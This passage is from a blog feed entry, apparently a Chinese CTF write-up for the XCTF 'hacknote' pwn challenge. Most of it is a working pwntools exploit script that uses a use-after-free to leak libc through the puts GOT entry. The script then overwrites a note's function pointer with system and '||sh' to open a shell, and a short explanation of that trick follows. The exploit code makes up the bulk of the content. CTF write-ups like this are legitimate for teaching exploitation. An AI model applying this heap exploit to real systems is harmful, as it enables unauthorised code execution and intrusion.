class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"><span class="comment"># r = remote(&#x27;111.200.241.244&#x27;, 49789)</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Note size :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Content :&#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">create(<span class="number">0x20</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = <span class="number">0x804862B</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = p32(puts_addr)+p32(puts_got)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x8</span>, payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">puts_real_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = puts_real_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(system_addr)</span><br><span class="line"><span class="built_in">print</span>(bin_sh_addr)</span><br><span class="line">payload = p32(system_addr)+<span class="string">b&#x27;||sh&#x27;</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x8</span>, payload)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>解释一下为什么使用||sh而不是用bin_sh_addr，我一开始也是一直想不通。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(&amp;ptr + v1) )</span><br><span class="line">  (**(&amp;ptr + v1))(*(&amp;ptr + v1));</span><br><span class="line"><span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br></pre></td></tr></table></figure><p>我们执行的是show函数的这一句<br><img src="/images/image-20211220154100280.png" alt="image-20211220154100280"></p><p>可以看到虽然我们构造的是sub_804862B这个函数的地址和puts的got表，但是我们下面都已经输出了我们recv的地址但是上面0x2d前面还存在其他数据，就是因为我们执行的参数并不是只是got表，是chunk的那一坨都要执行。</p><p>所以我们最终的payload其实是执行system(note)，参数就是地址+||sh地址是肯定执行失败的所以会执行sh</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;检查保护&quot;&gt;&lt;a href=&quot;#检查保护&quot; class=&quot;headerlink&quot; title=&quot;检查保护&quot;&gt;&lt;/a&gt;检查保护&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/images/image-20211220153008547.png&quot; alt=&quot;image-2021</summary>
      
    
    
    
    <category term="pwn-xctf" scheme="https://cv196082.gitee.io/categories/pwn-xctf/"/>
    
    
    <category term="UAF" scheme="https://cv196082.gitee.io/tags/UAF/"/>
    
  </entry>
  
</feed>
